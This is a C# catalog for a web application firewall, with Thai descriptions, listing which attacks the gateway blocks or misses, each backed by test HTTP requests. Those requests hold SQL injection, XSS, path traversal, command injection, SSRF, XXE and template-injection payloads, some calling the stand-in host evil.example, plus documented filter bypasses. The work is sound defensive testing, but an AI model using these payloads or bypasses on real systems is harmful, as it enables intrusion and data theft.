namespace AegisWAF.Client;

public enum Coverage { Covered, Partial, NotCovered }

/// <summary>An exact HTTP request used to demonstrate (and, in tests, to verify) a claim.</summary>
public sealed record ProbeRequest(string Method, string Target, string? ContentType = null, string? Body = null, bool Chunked = false,
    IReadOnlyDictionary<string, string>? Headers = null);

/// <summary>
/// One example for a protection item. <see cref="ExpectBlocked"/> is the verified behaviour of the current gateway for
/// <see cref="Request"/> sent exactly as written. <see cref="SandboxText"/> is the text the rule sandbox can evaluate for it
/// (null when the example depends on headers, body type, size or framing, which the sandbox cannot represent).
/// </summary>
public sealed record ProtectionExample(string Label, ProbeRequest Request, bool ExpectBlocked, string? SandboxText);

public sealed record ProtectionItem(string Id, string Title, Coverage Coverage, string Summary, string Limits, IReadOnlyList<ProtectionExample> Examples)
{
    public RuleSecurityMetadata Owasp => OwaspCatalog.ForRule(Id);
}

/// <summary>
/// What the current gateway really protects against, after the v0.7.1 engine upgrade (normalisation + headers/cookies/all-body-types +
/// expanded signatures). Every example is executed against a real gateway by the test suite (CatalogVerificationTests), so this list
/// cannot silently drift from the code. Thai text is user-facing.
/// </summary>
public static class ProtectionCatalog
{
    private const string Json = "application/json";
    private const string Form = "application/x-www-form-urlencoded";

    // GET query example: the full target is also what the sandbox evaluates (Match normalises it the same way).
    private static ProtectionExample Q(string label, string target, bool blocked) => new(label, new ProbeRequest("GET", target), blocked, target);
    private static ProtectionExample J(string label, string body, bool blocked) => new(label, new ProbeRequest("POST", "/api-demo", Json, body), blocked, body);
    private static ProtectionExample F(string label, string body, bool blocked) => new(label, new ProbeRequest("POST", "/api-demo", Form, body), blocked, body);
    private static ProtectionExample H(string label, string header, string value, bool blocked, string? sandbox) =>
        new(label, new ProbeRequest("GET", "/s", Headers: new Dictionary<string, string> { [header] = value }), blocked, sandbox);
    private static ProtectionExample B(string label, string contentType, string body, bool blocked, string? sandbox, bool chunked = false) =>
        new(label, new ProbeRequest("POST", "/api-demo", contentType, body, chunked), blocked, sandbox);

    public static IReadOnlyList<ProtectionItem> Items { get; } =
    [
        new("sqli", "SQL Injection (แทรกคำสั่งฐานข้อมูล)", Coverage.Partial,
            "ตรวจ UNION SELECT, เงื่อนไขบูลีน (OR 1=1), time-based (sleep/benchmark/waitfor), stacked query (;DROP) และการอ่าน metadata — โดย ถอดรหัส %xx (รวมการเข้ารหัสซ้ำ), แปลง + เป็นช่องว่าง และ ลบคอมเมนต์ /**/ ก่อนตรวจ จึงจับรูปแบบที่ส่งจากเบราว์เซอร์จริงได้แล้ว",
            "ยังมีช่องหลบ เช่น versioned comment ของ MySQL (/*!50000union*/) ที่ถูกลบทิ้งทั้งก้อน และการเข้ารหัสแปลกๆ เฉพาะฐานข้อมูล นอกจากนี้คำปกติที่บังเอิญมีรูปแบบคำสั่ง (เช่น sleep( ในข้อความทั่วไป) อาจถูกบล็อกผิดพลาด",
            [
                Q("sleep(5) ใน URL", "/search?q=sleep(5)", true),
                Q("UNION SELECT ที่เบราว์เซอร์เข้ารหัสช่องว่างเป็น %20", "/search?q=1%20union%20select%201", true),
                Q("OR 1=1 ที่เข้ารหัสช่องว่าง", "/search?q=1%20or%201=1", true),
                Q("ซ่อนด้วยคอมเมนต์ /**/", "/search?q=1/**/union/**/select/**/1", true),
                Q("'; DROP TABLE users;--", "/search?q=%27%3B%20DROP%20TABLE%20users%3B--", true),
                J("UNION SELECT ใน JSON", "{\"q\":\"1 union select 1\"}", true),
                F("1+union+select+1 ในฟอร์ม", "q=1+union+select+1", true),
                Q("(ตัวอย่าง false positive) คำว่า sleep(8) ในข้อความปกติ", "/search?q=sleep(8)", true),
                Q("หลบด้วย versioned comment /*!50000union*/", "/search?q=/*!50000union*/select+1", false),
            ]),

        new("xss", "Cross-Site Scripting (ฝังสคริปต์)", Coverage.Partial,
            "ตรวจ <script>, javascript:/vbscript:, event handler หลายสิบตัว (onerror, onload, ontoggle …), แท็กอันตราย (<svg>, <img>, <iframe> …) และ sink เช่น document.cookie — หลังถอดรหัส %xx, HTML entity และ รวมอักษร Unicode (NFKC) แล้ว จึงจับทั้งที่ส่งผ่าน URL จากเบราว์เซอร์และที่ซ่อนด้วยอักษร fullwidth",
            "รายการ event handler และแท็กยาวแต่ไม่ครบทุกตัว (เช่น handler ใหม่ๆ อาจหลุด) และยังไม่ป้องกัน DOM-based XSS ที่เกิดจากสคริปต์ฝั่งหน้าเว็บเอง",
            [
                Q("javascript: ใน URL", "/go?u=javascript:alert(1)", true),
                Q("<script> ที่เบราว์เซอร์เข้ารหัสเป็น %3C", "/s?q=%3Cscript%3Ealert(1)%3C/script%3E", true),
                Q("<svg onload=...> ที่เข้ารหัส", "/s?q=%3Csvg%20onload%3Dalert(1)%3E", true),
                Q("HTML entity &lt;script&gt;", "/s?q=&lt;script&gt;alert(1)", true),
                Q("หลบด้วยวงเล็บ fullwidth ＜script＞ (รวมด้วย Unicode NFKC)", "/s?q=%EF%BC%9Cscript%EF%BC%9Ealert(1)%EF%BC%9C/script%EF%BC%9E", true),
                J("<script> ใน JSON", "{\"q\":\"<script>alert(1)</script>\"}", true),
                F("<script> ในฟอร์มที่ไม่ได้เข้ารหัส", "q=<script>alert(1)", true),
                Q("หลบด้วย handler ที่ไม่อยู่ในรายการ (onbeforetoggle)", "/s?q=<x%20onbeforetoggle=alert(1)>", false),
            ]),

        new("path", "Path Traversal (ย้อนโฟลเดอร์อ่านไฟล์)", Coverage.Partial,
            "ตรวจ ../ และ ..\\ หลังถอดรหัส (รวมการเข้ารหัสซ้ำ %252e และ UTF-8 overlong) และการอ้างไฟล์ระบบตรงๆ เช่น /etc/passwd, win.ini, web.config, .ssh/id_rsa",
            "การอ่านไฟล์ผ่านพารามิเตอร์ที่ชื่อไฟล์ดูปกติ (เช่น file=config/database.yml) แยกจากทราฟฟิกจริงไม่ได้ จึงหลุด — ต้องจำกัดที่เว็บของคุณ (allowlist)",
            [
                Q("../../etc/passwd", "/file?f=../../etc/passwd", true),
                Q("..%2f แบบผสม (ถอดรหัสแล้วเป็น ../)", "/file?f=..%2f..%2fetc/passwd", true),
                Q("เข้ารหัสซ้ำ %252e%252e%252f", "/file?f=%252e%252e%252fetc/passwd", true),
                Q("อ้าง /etc/passwd ตรงๆ โดยไม่มี ../", "/file?f=/etc/passwd", true),
                Q("อ้าง web.config (Windows/IIS)", "/file?f=/app/web.config", true),
                Q("หลบด้วยชื่อไฟล์ที่ดูปกติ", "/download?file=config/database.yml", false),
            ]),

        new("lfi", "LFI / RFI (ดึงไฟล์ในเครื่องหรือภายนอก)", Coverage.Partial,
            "ตรวจตัวจัดการสตรีม/สคีมอันตราย เช่น php://filter, file://, data://, gopher://, dict://",
            "การ include จากภายนอกผ่าน http(s):// (RFI แบบคลาสสิก) ยังไม่ถูกบล็อก เพราะ URL ในพารามิเตอร์เป็นเรื่องปกติของหลายเว็บ",
            [
                Q("php://filter", "/load?f=php://filter/convert.base64-encode/resource=index.php", true),
                Q("file:// wrapper", "/load?f=file:///etc/passwd", true),
                Q("หลบด้วย RFI ผ่าน http://", "/load?f=http://evil.example/shell.txt", false),
            ]),

        new("cmdi", "Command Injection (แทรกคำสั่งระบบ)", Coverage.Partial,
            "ตรวจตัวคั่นคำสั่ง (; | & ขึ้นบรรทัดใหม่) ตามด้วยคำสั่งระบบที่พบบ่อย (cat, id, whoami, curl, wget …) และการแทนค่าคำสั่ง $(...), ${...}, backtick, /bin/sh, cmd.exe",
            "ตรวจจากรายชื่อคำสั่งที่รู้จัก การเรียกสคริปต์/ไบนารีชื่ออื่น (เช่น ;./deploy.sh) ยังหลุด — เว็บของคุณไม่ควรส่ง input เข้า shell โดยตรง",
            [
                Q("; id", "/s?q=%3Bid", true),
                Q("| whoami", "/s?q=%7Cwhoami", true),
                Q("$(...) command substitution", "/s?q=$(whoami)", true),
                Q("หลบด้วยไบนารีชื่ออื่น ;./deploy.sh", "/s?q=%3B./deploy.sh", false),
            ]),

        new("ssrf", "SSRF (ให้เซิร์ฟเวอร์ยิงเป้าภายใน)", Coverage.Partial,
            "ตรวจ URL ด้วย parser, บล็อก cloud metadata, loopback, private/link-local IP และ scheme อันตราย (file://, gopher://, data:// ฯลฯ)",
            "ไม่ resolve DNS และไม่รู้จักชื่อโฮสต์ภายในองค์กรที่ดูเป็น public จึงยังอาจหลุด — ควบคุมที่เว็บของคุณ (ไม่รับ URL จากผู้ใช้ หรือใช้ outbound allowlist)",
            [
                Q("เรียก cloud metadata 169.254.169.254", "/fetch?url=http://169.254.169.254/latest/meta-data/", true),
                Q("หลบด้วยชื่อโฮสต์องค์กรที่ guard ไม่รู้จัก", "/fetch?url=http://app.corp.example/admin", false),
            ]),

        new("nosql", "NoSQL Injection (แทรก operator ของ NoSQL)", Coverage.Partial,
            "ตรวจ operator ของ MongoDB/NoSQL เช่น $ne, $gt, $where, $regex, $exists ทั้งในรูป JSON ({\"$ne\":null}) และรูปแบบ array ใน query (user[$ne]=1) หลังถอดรหัส %xx แล้ว",
            "ตรวจจากโทเคน operator ที่เขียนตรงๆ การฉีดแบบ type juggling (user[]=admin) หรือที่ไลบรารีฝั่งเว็บประกอบ operator ขึ้นเองจากโครงสร้างข้อมูล ยังหลุด",
            [
                Q("{\"$ne\":null} ใน query (เข้ารหัส)", "/login?user=%7B%22%24ne%22%3Anull%7D", true),
                Q("รูปแบบ array user[$ne]=1 (เข้ารหัส)", "/login?user%5B%24ne%5D=1", true),
                J("{\"user\":{\"$gt\":\"\"}} ใน JSON", "{\"user\":{\"$gt\":\"\"}}", true),
                Q("หลบด้วย type juggling user[]=admin", "/login?user%5B%5D=admin&pass%5B%5D=x", false),
            ]),

        new("xxe", "XXE (XML External Entity)", Coverage.Partial,
            "ตรวจ <!DOCTYPE … [ … ]>, <!ENTITY … SYSTEM …> และ SYSTEM/PUBLIC ที่อ้างสคีมอันตราย (file://, http://) ในเนื้อหา XML",
            "ตรวจจากลายเซ็นในข้อความ ไม่ได้ parse XML จริง การประกาศ DOCTYPE ปกติ (เช่น <!DOCTYPE html>) ไม่ถูกบล็อก และ payload ที่แยกส่วนผิดรูปอาจหลุด",
            [
                B("entity อ่านไฟล์ file:///etc/passwd", "application/xml",
                  "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>", true,
                  "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>"),
                B("external DTD ผ่าน http:// (SSRF/exfil)", "text/xml",
                  "<!DOCTYPE r SYSTEM \"http://evil.example/x.dtd\">", true,
                  "<!DOCTYPE r SYSTEM \"http://evil.example/x.dtd\">"),
                B("XML ปกติที่มี <!DOCTYPE html> (ไม่บล็อกทุก DOCTYPE)", "application/xml",
                  "<!DOCTYPE html><note><to>a</to></note>", false, "<!DOCTYPE html><note><to>a</to></note>"),
            ]),

        new("ssti", "Template Injection (SSTI ฝั่งเซิร์ฟเวอร์)", Coverage.Partial,
            "ตรวจนิพจน์เลขคณิตใน template ({{7*7}}, ${7*7}) และคีย์เวิร์ดอันตรายของ template engine (config, __class__, runtime, processbuilder …) ในรูปแบบ {{…}}, ${…}, <%…%>, #{…}",
            "ตรวจเฉพาะรูปแบบที่รู้จัก การใช้ template ตามปกติ (เช่น {{user.name}}) ไม่ถูกบล็อก และไวยากรณ์ของ engine ที่ไม่ครอบคลุมอาจหลุด",
            [
                Q("ทดสอบ {{7*7}} (Jinja/Twig)", "/page?name=%7B%7B7*7%7D%7D", true),
                Q("${7*7} (EL/JSP)", "/page?x=%24%7B7*7%7D", true),
                J("{{config.items()}} ใน JSON", "{\"q\":\"{{config.items()}}\"}", true),
                Q("หลบด้วย template ปกติ {{user.name}}", "/page?name=%7B%7Buser.name%7D%7D", false),
            ]),

        new("response", "ตรวจข้อมูลขาออก (Response leak)", Coverage.Partial,
            "ตรวจคำตอบที่เซิร์ฟเวอร์ปลายทางส่งกลับ หากหลุดข้อมูลอ่อนไหว (เนื้อไฟล์ passwd/shadow, private key, ข้อความ error ของฐานข้อมูล, stack trace) จะระงับไม่ให้ถึงผู้ใช้และตอบ 502 แทน ปิดได้ด้วย Waf:InspectResponses=false",
            "ตรวจคำตอบที่เป็นข้อความ (html/text/json/xml) และ opaque bytes ที่เป็นข้อความ UTF-8 ภายใน 256 KB (ปรับด้วย Waf:MaxResponseInspectBytes); ไบนารีจริงหรือคำตอบที่ใหญ่กว่านี้ยังมี behavior แบบ fail-open ตาม configuration — ยืนยันด้วย EngineUpgradeTests",
            []),

        new("headers", "การโจมตีผ่าน Header / Cookie / User-Agent", Coverage.Partial,
            "ตรวจ payload ในหัวข้อที่พบบ่อย (User-Agent, Referer, Origin, X-Forwarded-*, Cookie) ด้วยกฎชุดเดียวกับ URL และรู้จักเครื่องมือสแกน (sqlmap, nikto, nuclei …) จาก User-Agent",
            "ตรวจเฉพาะหัวข้อในรายการที่กำหนด payload ที่ซ่อนในหัวข้อแบบกำหนดเองชื่ออื่นจะหลุด",
            [
                H("User-Agent เป็น sqlmap", "User-Agent", "sqlmap/1.7", true, null),
                H("<script> ใน Cookie", "Cookie", "a=<script>alert(1)</script>", true, "a=<script>alert(1)</script>"),
                H("sleep(5) ใน X-Forwarded-Host", "X-Forwarded-Host", "sleep(5)", true, "sleep(5)"),
                H("หลบด้วยหัวข้อที่ไม่ถูกตรวจ (X-Custom-Data)", "X-Custom-Data", "<script>alert(1)</script>", false, null),
            ]),

        new("bodytypes", "ตรวจเนื้อหาคำขอทุกชนิด", Coverage.Partial,
            "ตรวจเนื้อหาของ JSON, ฟอร์ม, text/plain, XML, multipart (อัปโหลดไฟล์), คำขอแบบ chunked และ opaque body ที่เป็นข้อความ UTF-8 ภายใน budget",
            "ไบนารีจริงที่มี NUL/control bytes หรือ UTF-8 ไม่ถูกต้องจะไม่ถูก decode เป็นข้อความ; body ที่เกิน inspection budget ถูกปฏิเสธ",
            [
                B("<script> ใน text/plain", "text/plain", "<script>alert(1)</script>", true, "<script>alert(1)</script>"),
                B("<script> ใน multipart", "multipart/form-data; boundary=XX", "--XX\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\n<script>alert(1)</script>\r\n--XX--\r\n", true, "<script>alert(1)</script>"),
                B("JSON เดียวกันแต่ส่งแบบ chunked", Json, "{\"q\":\"<script>alert(1)</script>\"}", true, "{\"q\":\"<script>alert(1)</script>\"}", chunked: true),
                B("ฟอร์ม q=%3Cscript%3E (เข้ารหัส)", Form, "q=%3Cscript%3Ealert(1)", true, "q=%3Cscript%3Ealert(1)"),
                B("ข้อความโจมตีที่ปลอมเป็นชนิดไบนารี application/octet-stream", "application/octet-stream", "<script>alert(1)</script>", true, "<script>alert(1)</script>"),
                B("ไบนารีจริงที่มี NUL ใน application/octet-stream", "application/octet-stream", "PK\0\0\u0001\u0002", false, null),
            ]),

        new("custom", "กฎที่คุณเขียนเอง (Regex)", Coverage.Covered,
            "เพิ่มรูปแบบที่ต้องการบล็อกได้เองที่เมนู กฎการป้องกัน ตรวจทุกจุดเดียวกับกฎมาตรฐาน (URL, header, cookie, body ทุกชนิด) และได้ประโยชน์จากการถอดรหัส/normalize เช่นกัน ใช้ Regex แบบ NonBacktracking (ปลอดภัยต่อการค้างเครื่อง, จำกัดเวลา 20 มิลลิวินาที)",
            "ตรวจได้เท่าที่กฎเขียนไว้",
            []),

        new("ipblock", "บล็อก / อนุญาตตาม IP", Coverage.Covered,
            "บล็อกทุกคำขอจาก IP หรือ network CIDR ที่กำหนด (IPv4/IPv6) และเลือก policy ที่เฉพาะเจาะจงที่สุดเมื่อช่วงซ้อนกัน มีปุ่มบล็อกจากหน้าเหตุการณ์",
            "รายการ allow เป็นเพียงข้อยกเว้นจาก blocklist ไม่ข้าม signature inspection หรือ rate limit; ระบบเห็น IP ต้นทางตาม trusted-proxy configuration",
            []),

        new("ratelimit", "จำกัดความถี่คำขอ (Rate limit)", Coverage.Partial,
            "IP หนึ่งส่งได้ไม่เกิน 300 คำขอต่อนาที ที่เกินจะได้ HTTP 429 ช่วยชะลอการเดารหัสผ่านและการสแกนรัวๆ",
            "ตัวเลข 300 ตายตัว (ยังปรับไม่ได้) นับเป็นช่วงนาทีคงที่ในหน่วยความจำของโปรแกรมนี้เท่านั้น ไม่ใช่การป้องกัน DDoS (หลาย IP หรือส่งช้าๆ ไม่ถูกจำกัด)",
            []),

        new("bodysize", "ขนาดคำขอที่ผิดปกติ", Coverage.Covered,
            "ปฏิเสธ URL/ข้อความที่ตรวจยาวเกิน 8,192 ตัวอักษร และปฏิเสธเนื้อหาคำขอที่ใหญ่เกิน 128 KB แบบ fail-closed (เดิม 64 KB และเคยบล็อก JSON ปกติที่เกิน 8 KB ผิดพลาด ตอนนี้แก้แล้ว)",
            "ขีดจำกัด 128 KB ปรับได้ด้วยค่า Waf:MaxBodyInspectBytes เว็บที่รับไฟล์/ข้อมูลใหญ่กว่านี้ต้องตั้งค่าเพิ่ม",
            [
                B("JSON ปกติ 9,000 ตัวอักษร (ไม่ถูกบล็อกผิดพลาดแล้ว)", Json, "{\"q\":\"" + new string('a', 9000) + "\"}", false, null),
                B("เนื้อหาใหญ่เกิน 128 KB ถูกปฏิเสธ (fail-closed)", Json, "{\"q\":\"" + new string('a', 140000) + "\"}", true, null),
            ]),

        new("admin", "ป้องกันหน้าจัดการของระบบเอง", Coverage.Covered,
            "บัญชีผู้ใช้เก็บรหัสผ่านแบบ hash (PBKDF2-SHA512) ล็อกบัญชีเมื่อใส่ผิดซ้ำ ตรวจสิทธิ์ 5 ระดับฝั่งเซิร์ฟเวอร์ ป้องกัน CSRF เซสชันถูกเพิกถอนได้ รับเฉพาะการเข้าจากเครื่องนี้ และบันทึกประวัติการใช้งาน",
            "ระบบบังคับ password policy สำหรับการสร้าง/เปลี่ยนรหัส และจำกัดการลองรหัสด้วย account lockout กับ buckets แยก IP/username/pair; ยังไม่มี MFA",
            []),

        new("other", "ด้านอื่นที่ระบบนี้ยังไม่ทำ", Coverage.NotCovered,
            "ยังไม่ครอบคลุม: XXE แบบ parse จริง (ตรวจด้วยลายเซ็นเท่านั้น), GeoIP / threat intelligence / bot management เต็มรูปแบบ, การถอดรหัส charset ที่ไม่ใช่ UTF-8, WebSocket payload ไม่ใช่ตัวกัน DDoS และไม่มี HTTPS ในตัว (ต้องวางหลังตัวที่ทำ TLS)",
            "ระบบนี้เป็นการป้องกันด้วยลายเซ็น + normalize (รวม Unicode NFKC) + คะแนนความผิดปกติ (anomaly scoring) + ตรวจข้อมูลขาออกชั้นแรก ใช้เสริมกับการเขียนโค้ดเว็บให้ปลอดภัย ไม่ใช่ตัวแทน WAF เต็มรูปแบบ และยังไม่ผ่านการทดสอบเจาะระบบโดยผู้เชี่ยวชาญอิสระ",
            []),
    ];
}
